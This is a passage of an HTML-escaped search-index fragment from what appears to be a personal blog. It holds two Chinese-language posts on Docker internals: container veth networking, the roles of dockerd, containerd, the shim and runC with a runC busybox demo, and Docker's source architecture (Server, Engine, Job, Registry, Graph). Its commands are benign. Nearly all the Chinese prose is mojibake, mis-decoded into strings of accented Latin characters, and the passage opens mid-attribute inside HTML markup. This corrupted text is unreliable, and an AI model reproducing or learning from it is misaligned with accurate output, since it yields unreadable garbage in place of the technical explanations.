&lt;li&gt;æœ¬åœ°ä¸»æœºä¸€ç«¯çš„è™šæ‹Ÿæ¥å£è¿æ¥åˆ°é»˜è®¤çš„docker0ç½‘æ¡¥æˆ–æŒ‡å®šç½‘æ¡¥ä¸Šï¼Œå¹¶å…·æœ‰ä¸€ä¸ªä»¥vethå¼€å¤´çš„å”¯ä¸€åå­—ï¼Œå¦‚veth1234ã€‚&lt;/li&gt;
&lt;li&gt;å®¹å™¨ä¸€ç«¯çš„è™šæ‹Ÿæ¥å£å°†æ”¾åˆ°æ–°åˆ›å»ºå®¹å™¨ä¸­ï¼Œå¹¶ä¿®æ”¹åå­—ä½œä¸ºeth0ã€‚è¿™ä¸ªæ¥å£åªåœ¨å®¹å™¨çš„å‘½åç©ºé—´å¯è§&lt;/li&gt;
&lt;li&gt;ä»ç½‘æ¡¥å¯ç”¨åœ°å€æ®µä¸­è·å–ä¸€ä¸ªç©ºé—²åœ°å€åˆ†é…ç»™å®¹å™¨eth0ï¼Œå¹¶é…ç½®é»˜è®¤è·¯ç”±ç½‘å…³ä¸ºdocker0ç½‘å¡çš„å†…éƒ¨æ¥å£docker0çš„IPåœ°å€ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å®Œæˆè¿™äº›ä¹‹åï¼Œå®¹å™¨å°±å¯ä»¥ä½¿ç”¨å®ƒæ‰€èƒ½çœ‹åˆ°çš„eth0è™šæ‹Ÿç½‘å¡æ¥è¿æ¥å…¶ä»–å®¹å™¨å’Œè®¿é—®å¤–éƒ¨ç½‘ç»œã€‚&lt;/p&gt;
&lt;p&gt;å®¹å™¨çš„å®è´¨æ˜¯è¿›ç¨‹ï¼Œä½†ä¸ç›´æ¥åœ¨å®¿ä¸»æ‰§è¡Œçš„å®ä¾‹è¿›ç¨‹ä¸åŒï¼Œå®¹å™¨è¿›ç¨‹å±äºè‡ªå·±çš„ç‹¬ç«‹çš„å‘½åç©ºé—´ã€‚å› æ­¤å®¹å™¨å¯ä»¥æ‹¥æœ‰è‡ªå·±çš„rootæ–‡ä»¶ç³»ç»Ÿã€è‡ªå·±çš„ç½‘ç»œé…ç½®ã€è‡ªå·±çš„è¿›ç¨‹ç©ºé—´ã€ç”šè‡³è‡ªå·±çš„ç”¨æˆ·IDã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·çœ‹æ¥ï¼Œå®¹å™¨åªæ˜¯ä¸€ç§è¢«é™åˆ¶äº†çš„ç‰¹æ®Šè¿›ç¨‹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;docker-containerd-docker-shim-runcä¹‹é—´çš„å…³ç³»&#34;&gt;Dockerã€containerdã€docker-shimã€runCä¹‹é—´çš„å…³ç³»&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;dockerï¼šdockeræœ¬èº«è€Œè¨€åŒ…æ‹¬äº†docker clientå’Œdockerdï¼Œdockerdå®å±æ˜¯å¯¹å®¹å™¨ç›¸å…³æ“ä½œçš„apiçš„æœ€ä¸Šå±‚å°è£…ï¼Œç›´æ¥é¢å‘æ“ä½œç”¨æˆ·ï¼›&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;containerdï¼šdockerdå®é™…çœŸå®è°ƒç”¨çš„è¿˜æ˜¯containerdçš„apiæ¥å£(rpcæ–¹å¼å®ç°)ï¼Œcontainerdæ˜¯dockerdå’ŒrunCä¹‹é—´çš„ä¸€ä¸ªä¸­é—´äº¤æµç»„ä»¶ï¼Œç†è®ºä¸Šï¼Œä¸è¿è¡Œdockerdï¼Œä¹Ÿèƒ½å¤Ÿç›´æ¥é€šè¿‡containerdæ¥ç®¡ç†å®¹å™¨ã€‚&lt;/p&gt;
&lt;p&gt;å‘ä¸Šä¸ºDocker daemonæä¾›gRPCæ¥å£ï¼Œä½¿å¾—Docker Daemonå±è”½ä¸‹é¢çš„ç»“æ„å˜åŒ–ï¼Œç¡®ä¿åŸæœ‰æ¥å£å‘ä¸‹å…¼å®¹ã€‚å‘ä¸‹é€šè¿‡containerd-shimç»“åˆrunCï¼Œä½¿å¾—å¼•æ“å¯ä»¥ç‹¬ç«‹å‡çº§ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;docker-shimï¼šçœŸå®è¿è¡Œå®¹å™¨çš„è½½ä½“ï¼Œæ¯å¯åŠ¨ä¸€ä¸ªå®¹å™¨éƒ½ä¼šèµ·ä¸€ä¸ªæ–°çš„docker-shimçš„è¿›ç¨‹ã€‚å®ƒé€šè¿‡æŒ‡å®šä¸‰ä¸ªå‚æ•°ï¼šå®¹å™¨IDã€bundleç›®å½•(containerdå¯¹åº”æŸä¸ªå®¹å™¨ç”Ÿæˆç›®å½•ï¼Œä¸€èˆ¬ä½äºï¼š/var/run/docker/libcontainerd/containerIDï¼Œå…¶ä¸­åŒ…æ‹¬äº†å®¹å™¨é…ç½®å’Œæ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯ä¸‰ä¸ªç®¡é“æ–‡ä»¶)ï¼Œè¿è¡Œæ—¶äºŒè¿›åˆ¶(é»˜è®¤æ˜¯runC)ï¼Œæ¥è°ƒç”¨runCçš„apiåˆ›å»ºä¸€ä¸ªå®¹å™¨ã€‚&lt;/p&gt;
&lt;p&gt;ä¸»è¦ä½œç”¨æ˜¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å®ƒå…è®¸å®¹å™¨è¿è¡Œæ—¶(å³ runC)åœ¨å¯åŠ¨å®¹å™¨ä¹‹åé€€å‡ºï¼Œç®€å•è¯´å°±æ˜¯ä¸å¿…ä¸ºæ¯ä¸ªå®¹å™¨ä¸€ç›´è¿è¡Œä¸€ä¸ªå®¹å™¨è¿è¡Œæ—¶(runC)&lt;/li&gt;
&lt;li&gt;å³ä½¿åœ¨ containerd å’Œ dockerd éƒ½æŒ‚æ‰çš„æƒ…å†µä¸‹ï¼Œå®¹å™¨çš„æ ‡å‡† IO å’Œå…¶å®ƒçš„æ–‡ä»¶æè¿°ç¬¦ä¹Ÿéƒ½æ˜¯å¯ç”¨çš„&lt;/li&gt;
&lt;li&gt;å‘ containerd æŠ¥å‘Šå®¹å™¨çš„é€€å‡ºçŠ¶æ€&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526233346.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;æœ‰äº†å®ƒå°±å¯ä»¥åœ¨ä¸ä¸­æ–­å®¹å™¨è¿è¡Œçš„æƒ…å†µä¸‹å‡çº§æˆ–é‡å¯ dockerdï¼Œå¯¹äºç”Ÿäº§ç¯å¢ƒæ¥è¯´æ„ä¹‰é‡å¤§ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;runCï¼šæ˜¯ Docker å…¬å¸æŒ‰ç…§ OCI æ ‡å‡†è§„èŒƒç¼–å†™çš„ä¸€ä¸ªæ“ä½œå®¹å™¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå…¶å‰èº«æ˜¯ libcontainer é¡¹ç›®æ¼”åŒ–è€Œæ¥ï¼ŒrunC å®é™…ä¸Šå°±æ˜¯ libcontainer é…ä¸Šäº†ä¸€ä¸ªè½»å‹çš„å®¢æˆ·ç«¯ï¼Œæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ç«¯ï¼Œæ ¹æ® OCIï¼ˆå¼€æ”¾å®¹å™¨ç»„ç»‡ï¼‰çš„æ ‡å‡†æ¥åˆ›å»ºå’Œè¿è¡Œå®¹å™¨ï¼Œå®ç°äº†å®¹å™¨å¯åœã€èµ„æºéš”ç¦»ç­‰åŠŸèƒ½ã€‚Dockeré»˜è®¤æä¾›äº†docker-runcå®ç°ï¼Œäº‹å®ä¸Šï¼Œé€šè¿‡containerdçš„å°è£…ï¼Œå¯ä»¥åœ¨Docker Daemonå¯åŠ¨çš„æ—¶å€™æŒ‡å®šruncçš„å®ç°ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä½¿ç”¨runCè¿è¡Œbusybox&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mkdir /container
# cd /container/
# mkdir rootfs

å‡†å¤‡å®¹å™¨é•œåƒçš„æ–‡ä»¶ç³»ç»Ÿ,ä» busybox é•œåƒä¸­æå–
# docker export $(docker create busybox) | tar -C rootfs -xvf -
# ls rootfs/
bin  dev  etc  home  proc  root  sys  tmp  usr  var

# æœ‰äº†rootfsä¹‹åï¼Œæˆ‘ä»¬è¿˜è¦æŒ‰ç…§ OCI æ ‡å‡†æœ‰ä¸€ä¸ªé…ç½®æ–‡ä»¶ config.json è¯´æ˜å¦‚ä½•è¿è¡Œå®¹å™¨ï¼Œ
# åŒ…æ‹¬è¦è¿è¡Œçš„å‘½ä»¤ã€æƒé™ã€ç¯å¢ƒå˜é‡ç­‰ç­‰å†…å®¹ï¼Œrunc æä¾›äº†ä¸€ä¸ªå‘½ä»¤å¯ä»¥è‡ªåŠ¨å¸®æˆ‘ä»¬ç”Ÿæˆ
# docker-runc spec
# ls
config.json  rootfs
# docker-runc run simplebusybox    #å¯åŠ¨å®¹å™¨
/ # ls
bin   dev   etc   home  proc  root  sys   tmp   usr   var
/ # hostname
runc
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526312331.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å½“Docker daemonå¯åŠ¨ä¹‹åï¼Œ&lt;strong&gt;dockerdå’Œdocker-containerdè¿›ç¨‹ä¸€ç›´å­˜åœ¨&lt;/strong&gt;ã€‚å½“å¯åŠ¨å®¹å™¨ä¹‹åï¼Œ&lt;strong&gt;docker-containerdè¿›ç¨‹ä¼šåˆ›å»ºdocker-containerd-shimè¿›ç¨‹&lt;/strong&gt;ã€‚æœ€ådocker-containerd-shimå­è¿›ç¨‹ï¼Œå·²ç»æ˜¯å®é™…åœ¨å®¹å™¨ä¸­è¿è¡Œçš„è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;moby-docker-ceä¸docker-eeçš„åŒºåˆ«&#34;&gt;mobyã€docker-ceä¸docker-eeçš„åŒºåˆ«&lt;/h2&gt;
&lt;p&gt;æœ€æ—©çš„æ—¶å€™dockerå°±æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œä¸»è¦ç”±dockerå…¬å¸ç»´æŠ¤ã€‚&lt;/p&gt;
&lt;p&gt;2017å¹´å¹´åˆï¼Œdockerå…¬å¸å°†åŸå…ˆçš„dockeré¡¹ç›®æ”¹åä¸ºmobyï¼Œå¹¶åˆ›å»ºäº†docker-ceå’Œdocker-eeã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸‰è€…çš„å…³ç³»æ˜¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mobyæ˜¯ç»§æ‰¿äº†åŸå…ˆçš„dockerçš„é¡¹ç›®ï¼Œæ˜¯ç¤¾åŒºç»´æŠ¤çš„çš„å¼€æºé¡¹ç›®ï¼Œè°éƒ½å¯ä»¥åœ¨mobyçš„åŸºç¡€æ‰“é€ è‡ªå·±çš„å®¹å™¨äº§å“&lt;/li&gt;
&lt;li&gt;docker-ceæ˜¯dockerå…¬å¸ç»´æŠ¤çš„å¼€æºé¡¹ç›®ï¼Œæ˜¯ä¸€ä¸ªåŸºäºmobyé¡¹ç›®çš„å…è´¹çš„å®¹å™¨äº§å“&lt;/li&gt;
&lt;li&gt;docker-eeæ˜¯dockerå…¬å¸ç»´æŠ¤çš„é—­æºäº§å“ï¼Œæ˜¯dockerå…¬å¸çš„å•†ä¸šäº§å“ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;moby projectç”±ç¤¾åŒºç»´æŠ¤ï¼Œ docker-ce projectæ˜¯dockerå…¬å¸ç»´æŠ¤ï¼Œdocker-eeæ˜¯é—­æºçš„ã€‚&lt;/p&gt;
&lt;p&gt;è¦ä½¿ç”¨å…è´¹çš„dockerï¼Œä»ç½‘é¡µdocker-ceä¸Šè·å–ã€‚&lt;/p&gt;
&lt;p&gt;è¦ä½¿ç”¨æ”¶è´¹çš„dockerï¼Œä»ç½‘é¡µdocker-eeä¸Šè·å–ã€‚&lt;/p&gt;
">ã€å®¹å™¨ã€‘Dockeræ¶æ„ã€æ ¸å¿ƒæ¦‚å¿µ</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/docker-yuan-ma-jia-gou/"" data-c="
          &lt;p&gt;æœ¬æ–‡å‚è€ƒï¼šhttps://www.infoq.cn/article/docker-source-code-analysis-part1/&lt;/p&gt;
&lt;h2 id=&#34;dockeræºç æ¶æ„&#34;&gt;Dockeræºç æ¶æ„&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526355102.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;æ¦‚è¿°&#34;&gt;æ¦‚è¿°&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Docker Clientï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç”¨æˆ·æ˜¯é€šè¿‡Docker Clientä¸Docker Daemonå»ºç«‹é€šä¿¡ï¼Œå¹¶å‘é€è¯·æ±‚ç»™åè€…ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Docker Daemonï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Docker Daemonä¸€æ–¹é¢å¯ä»¥æ¥æ”¶ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¦ä¸€æ–¹é¢é€šè¿‡Engineæ‰§è¡ŒDockerå†…éƒ¨çš„ä¸€ç³»åˆ—å·¥ä½œï¼Œæ¯ä¸€é¡¹å·¥ä½œéƒ½æ˜¯ä»¥ä¸€ä¸ªJobçš„å½¢å¼å­˜åœ¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Jobï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Jobçš„è¿è¡Œè¿‡ç¨‹ä¸­ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å½“éœ€è¦å®¹å™¨é•œåƒæ—¶ï¼Œåˆ™ä»Docker Registryä¸­ä¸‹è½½é•œåƒï¼Œå¹¶é€šè¿‡é•œåƒç®¡ç†é©±åŠ¨graphdriverå°†ä¸‹è½½é•œåƒä»¥Graphçš„å½¢å¼å­˜å‚¨ï¼›&lt;/li&gt;
&lt;li&gt;å½“éœ€è¦åˆ›å»ºç½‘ç»œç¯å¢ƒæ—¶ï¼Œé€šè¿‡ç½‘ç»œç®¡ç†é©±åŠ¨networkdriveråˆ›å»ºå¹¶é…ç½®Dockerå®¹å™¨ç½‘ç»œç¯å¢ƒï¼›&lt;/li&gt;
&lt;li&gt;å½“éœ€è¦é™åˆ¶å®¹å™¨è¿è¡Œèµ„æºæˆ–æ‰§è¡Œç”¨æˆ·æŒ‡ä»¤ç­‰æ“ä½œæ—¶ï¼Œåˆ™é€šè¿‡execdriveræ¥å®Œæˆã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;libcontiainerï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;libcontaineræ—¶ä¸€é¡¹ç‹¬ç«‹çš„å®¹å™¨ç®¡ç†åŒ…ï¼Œnerworkdriverä»¥åŠexecdriveréƒ½æ˜¯é€šè¿‡libcontaineræ¥å®ç°å…·ä½“å¯¹å®¹å™¨è¿›è¡Œçš„æ“ä½œã€‚&lt;/p&gt;
&lt;h3 id=&#34;docker-client&#34;&gt;Docker Client&lt;/h3&gt;
&lt;p&gt;Docker Client æ˜¯ Docker æ¶æ„ä¸­ç”¨æˆ·ç”¨æ¥å’Œ Docker Daemon å»ºç«‹é€šä¿¡çš„å®¢æˆ·ç«¯ã€‚ç”¨æˆ·ä½¿ç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸ºdocker(ä½äº/bin/ä¸‹)ï¼Œæ¯å‘é€ä¸€æ¬¡è¯·æ±‚éœ€è¦æ‰§è¡Œä¸€æ¬¡ã€‚&lt;/p&gt;
&lt;p&gt;å¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸‰ç§æ–¹å¼ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tcp://host:port
unix://path_to_socket
fd://socketfd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;clientä¸daemonå»ºç«‹ä¼ è¾“è¯·æ±‚çš„æ—¶å€™ï¼Œclientå¯ä»¥é€šè¿‡è®¾ç½®å‘½ä»¤è¡Œflagå‚æ•°çš„å½¢å¼è®¾ç½®å®‰å…¨ä¼ è¾“å±‚åè®®TLSçš„æœ‰å…³å‚æ•°ï¼Œä¿è¯ä¼ è¾“çš„å®‰å…¨æ€§ã€‚&lt;/p&gt;
&lt;h3 id=&#34;docker-daemon&#34;&gt;Docker Daemon&lt;/h3&gt;
&lt;p&gt;Docker Daemon æ˜¯ Docker æ¶æ„ä¸­ä¸€ä¸ªå¸¸é©»åœ¨åå°çš„ç³»ç»Ÿè¿›ç¨‹ï¼Œè¯¥å®ˆæŠ¤è¿›ç¨‹åœ¨åå°å¯åŠ¨äº†ä¸€ä¸ª Serverï¼ŒServer è´Ÿè´£æ¥å— Docker Client å‘é€çš„è¯·æ±‚ï¼›æ¥å—è¯·æ±‚åï¼ŒServer é€šè¿‡è·¯ç”±ä¸åˆ†å‘è°ƒåº¦ï¼Œæ‰¾åˆ°ç›¸åº”çš„ Handler æ¥æ‰§è¡Œè¯·æ±‚ã€‚&lt;/p&gt;
&lt;p&gt;Docker Daemon å¯åŠ¨æ‰€ä½¿ç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶ä¹Ÿä¸º dockerï¼Œä¸ Docker Client å¯åŠ¨æ‰€ä½¿ç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶ docker ç›¸åŒã€‚åœ¨ docker å‘½ä»¤æ‰§è¡Œæ—¶ï¼Œé€šè¿‡ä¼ å…¥çš„å‚æ•°æ¥åˆ¤åˆ« Docker Daemon ä¸ Docker Clientã€‚&lt;/p&gt;
&lt;p&gt;Docker Daemonæ¶æ„ï¼Œå¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼šDocker Serverã€Engineã€Jobã€‚&lt;/p&gt;
&lt;h4 id=&#34;docker-server&#34;&gt;Docker Server&lt;/h4&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526376435.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;åœ¨ Docker çš„å¯åŠ¨è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡åŒ… gorilla/muxï¼Œåˆ›å»ºäº†ä¸€ä¸ª mux.Routerï¼Œæä¾›è¯·æ±‚çš„è·¯ç”±åŠŸèƒ½ã€‚åœ¨ Golang ä¸­ï¼Œgorilla/mux æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ URL è·¯ç”±å™¨ä»¥åŠè°ƒåº¦åˆ†å‘å™¨ã€‚è¯¥ mux.Router ä¸­æ·»åŠ äº†ä¼—å¤šçš„è·¯ç”±é¡¹ï¼Œæ¯ä¸€ä¸ªè·¯ç”±é¡¹ç”± HTTP è¯·æ±‚æ–¹æ³•ï¼ˆPUTã€POSTã€GET æˆ– DELETEï¼‰ã€URLã€Handler ä¸‰éƒ¨åˆ†ç»„æˆã€‚&lt;/p&gt;
&lt;p&gt;è‹¥ Docker Client é€šè¿‡ HTTP çš„å½¢å¼è®¿é—® Docker Daemonï¼Œåˆ›å»ºå®Œ mux.Router ä¹‹åï¼ŒDocker å°† Server çš„ç›‘å¬åœ°å€ä»¥åŠ mux.Router ä½œä¸ºå‚æ•°ï¼Œåˆ›å»ºä¸€ä¸ª httpSrv=http.Server{}ï¼Œæœ€ç»ˆæ‰§è¡Œ httpSrv.Serve() ä¸ºè¯·æ±‚æœåŠ¡ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ Server çš„æœåŠ¡è¿‡ç¨‹ä¸­ï¼ŒServer åœ¨ listener ä¸Šæ¥å— Docker Client çš„è®¿é—®è¯·æ±‚ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªå…¨æ–°çš„ goroutine æ¥æœåŠ¡è¯¥è¯·æ±‚ã€‚åœ¨ goroutine ä¸­ï¼Œé¦–å…ˆè¯»å–è¯·æ±‚å†…å®¹ï¼Œç„¶ååšè§£æå·¥ä½œï¼Œæ¥ç€æ‰¾åˆ°ç›¸åº”çš„è·¯ç”±é¡¹ï¼Œéšåè°ƒç”¨ç›¸åº”çš„ Handler æ¥å¤„ç†è¯¥è¯·æ±‚ï¼Œæœ€å Handler å¤„ç†å®Œè¯·æ±‚ä¹‹åå›å¤è¯¥è¯·æ±‚ã€‚&lt;/p&gt;
&lt;p&gt;éœ€è¦æ³¨æ„çš„æ˜¯ï¼šDocker Server çš„è¿è¡Œåœ¨ Docker çš„å¯åŠ¨è¿‡ç¨‹ä¸­ï¼Œæ˜¯é ä¸€ä¸ªåä¸º&amp;quot;serveapi&amp;quot;çš„ job çš„è¿è¡Œæ¥å®Œæˆçš„ã€‚åŸåˆ™ä¸Šï¼ŒDocker Server çš„è¿è¡Œæ˜¯ä¼—å¤š job ä¸­çš„ä¸€ä¸ªï¼Œä½†æ˜¯ä¸ºäº†å¼ºè°ƒ Docker Server çš„é‡è¦æ€§ä»¥åŠä¸ºåç»­ job æœåŠ¡çš„é‡è¦ç‰¹æ€§ï¼Œå°†è¯¥&amp;quot;serveapi&amp;quot;çš„ job å•ç‹¬æŠ½ç¦»å‡ºæ¥åˆ†æï¼Œç†è§£ä¸º Docker Serverã€‚&lt;/p&gt;
&lt;h4 id=&#34;docker-engine&#34;&gt;Docker engine&lt;/h4&gt;
&lt;p&gt;Engine æ˜¯ Docker æ¶æ„ä¸­çš„è¿è¡Œå¼•æ“ï¼ŒåŒæ—¶ä¹Ÿ Docker è¿è¡Œçš„æ ¸å¿ƒæ¨¡å—ã€‚å®ƒæ‰®æ¼” Docker container å­˜å‚¨ä»“åº“çš„è§’è‰²ï¼Œå¹¶ä¸”é€šè¿‡æ‰§è¡Œ job çš„æ–¹å¼æ¥æ“çºµç®¡ç†è¿™äº›å®¹å™¨ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ Engine æ•°æ®ç»“æ„çš„è®¾è®¡ä¸å®ç°è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€ä¸ª handler å¯¹è±¡ã€‚è¯¥ handler å¯¹è±¡å­˜å‚¨çš„éƒ½æ˜¯å…³äºä¼—å¤šç‰¹å®š job çš„ handler å¤„ç†è®¿é—®ã€‚ä¸¾ä¾‹è¯´æ˜ï¼ŒEngine çš„ handler å¯¹è±¡ä¸­æœ‰ä¸€é¡¹ä¸ºï¼š{â€œcreateâ€: daemon.ContainerCreate,}ï¼Œåˆ™è¯´æ˜å½“åä¸º&amp;quot;create&amp;quot;çš„ job åœ¨è¿è¡Œæ—¶ï¼Œæ‰§è¡Œçš„æ˜¯ daemon.ContainerCreate çš„ handlerã€‚&lt;/p&gt;
&lt;h4 id=&#34;job&#34;&gt;Job&lt;/h4&gt;
&lt;p&gt;ä¸€ä¸ª Job å¯ä»¥è®¤ä¸ºæ˜¯ Docker æ¶æ„ä¸­ Engine å†…éƒ¨æœ€åŸºæœ¬çš„å·¥ä½œæ‰§è¡Œå•å…ƒã€‚Docker å¯ä»¥åšçš„æ¯ä¸€é¡¹å·¥ä½œï¼Œéƒ½å¯ä»¥æŠ½è±¡ä¸ºä¸€ä¸ª jobã€‚ä¾‹å¦‚ï¼šåœ¨å®¹å™¨å†…éƒ¨è¿è¡Œä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™æ˜¯ä¸€ä¸ª jobï¼›åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œè¿™æ˜¯ä¸€ä¸ª jobï¼Œä» Internet ä¸Šä¸‹è½½ä¸€ä¸ªæ–‡æ¡£ï¼Œè¿™æ˜¯ä¸€ä¸ª jobï¼›åŒ…æ‹¬ä¹‹å‰åœ¨ Docker Server éƒ¨åˆ†è¯´è¿‡çš„ï¼Œåˆ›å»º Server æœåŠ¡äº HTTP çš„ APIï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ª jobï¼Œç­‰ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;Job çš„è®¾è®¡è€…ï¼ŒæŠŠ Job è®¾è®¡å¾—ä¸ Unix è¿›ç¨‹ç›¸ä»¿ã€‚æ¯”å¦‚è¯´ï¼šJob æœ‰ä¸€ä¸ªåç§°ï¼Œæœ‰å‚æ•°ï¼Œæœ‰ç¯å¢ƒå˜é‡ï¼Œæœ‰æ ‡å‡†çš„è¾“å…¥è¾“å‡ºï¼Œæœ‰é”™è¯¯å¤„ç†ï¼Œæœ‰è¿”å›çŠ¶æ€ç­‰ã€‚&lt;/p&gt;
&lt;h3 id=&#34;docker-registry&#34;&gt;Docker Registry&lt;/h3&gt;
&lt;p&gt;Docker Registry æ˜¯ä¸€ä¸ªå­˜å‚¨å®¹å™¨é•œåƒçš„ä»“åº“ã€‚è€Œå®¹å™¨é•œåƒæ˜¯åœ¨å®¹å™¨è¢«åˆ›å»ºæ—¶ï¼Œè¢«åŠ è½½ç”¨æ¥åˆå§‹åŒ–å®¹å™¨çš„æ–‡ä»¶æ¶æ„ä¸ç›®å½•ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ Docker çš„è¿è¡Œè¿‡ç¨‹ä¸­ï¼ŒDocker Daemon ä¼šä¸ Docker Registry é€šä¿¡ï¼Œå¹¶å®ç°æœç´¢é•œåƒã€ä¸‹è½½é•œåƒã€ä¸Šä¼ é•œåƒä¸‰ä¸ªåŠŸèƒ½ï¼Œè¿™ä¸‰ä¸ªåŠŸèƒ½å¯¹åº”çš„ job åç§°åˆ†åˆ«ä¸º&amp;quot;search&amp;quot;ï¼Œâ€œpullâ€ ä¸ â€œpushâ€ã€‚&lt;/p&gt;
&lt;p&gt;å…¶ä¸­ï¼Œåœ¨ Docker æ¶æ„ä¸­ï¼ŒDocker å¯ä»¥ä½¿ç”¨å…¬æœ‰çš„ Docker Registryï¼Œå³å¤§å®¶ç†ŸçŸ¥çš„&lt;a href=&#34;https://registry.hub.docker.com/&#34;&gt; Docker Hub &lt;/a&gt;ï¼Œå¦‚æ­¤ä¸€æ¥ï¼ŒDocker è·å–å®¹å™¨é•œåƒæ–‡ä»¶æ—¶ï¼Œå¿…é¡»é€šè¿‡äº’è”ç½‘è®¿é—® Docker Hubï¼›åŒæ—¶ Docker ä¹Ÿå…è®¸ç”¨æˆ·æ„å»ºæœ¬åœ°ç§æœ‰çš„ Docker Registryï¼Œè¿™æ ·å¯ä»¥ä¿è¯å®¹å™¨é•œåƒçš„è·å–åœ¨å†…ç½‘å®Œæˆã€‚&lt;/p&gt;
&lt;h3 id=&#34;graph&#34;&gt;Graph&lt;/h3&gt;
&lt;p&gt;Graph åœ¨ Docker æ¶æ„ä¸­æ‰®æ¼”å·²ä¸‹è½½å®¹å™¨é•œåƒçš„ä¿ç®¡è€…ï¼Œä»¥åŠå·²ä¸‹è½½å®¹å™¨é•œåƒä¹‹é—´å…³ç³»çš„è®°å½•è€…ã€‚ä¸€æ–¹é¢ï¼ŒGraph å­˜å‚¨ç€æœ¬åœ°å…·æœ‰ç‰ˆæœ¬ä¿¡æ¯çš„æ–‡ä»¶ç³»ç»Ÿé•œåƒï¼Œå¦ä¸€æ–¹é¢ä¹Ÿé€šè¿‡ GraphDB è®°å½•ç€æ‰€æœ‰æ–‡ä»¶ç³»ç»Ÿé•œåƒå½¼æ­¤ä¹‹é—´çš„å…³ç³»ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526431246.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å…¶ä¸­ï¼ŒGraphDB æ˜¯ä¸€ä¸ªæ„å»ºåœ¨ SQLite ä¹‹ä¸Šçš„å°å‹å›¾æ•°æ®åº“ï¼Œå®ç°äº†èŠ‚ç‚¹çš„å‘½åä»¥åŠèŠ‚ç‚¹ä¹‹é—´å…³è”å…³ç³»çš„è®°å½•ã€‚å®ƒä»…ä»…å®ç°äº†å¤§å¤šæ•°å›¾æ•°æ®åº“æ‰€æ‹¥æœ‰çš„ä¸€ä¸ªå°çš„å­é›†ï¼Œä½†æ˜¯æä¾›äº†ç®€å•çš„æ¥å£è¡¨ç¤ºèŠ‚ç‚¹ä¹‹é—´çš„å…³ç³»ã€‚&lt;/p&gt;
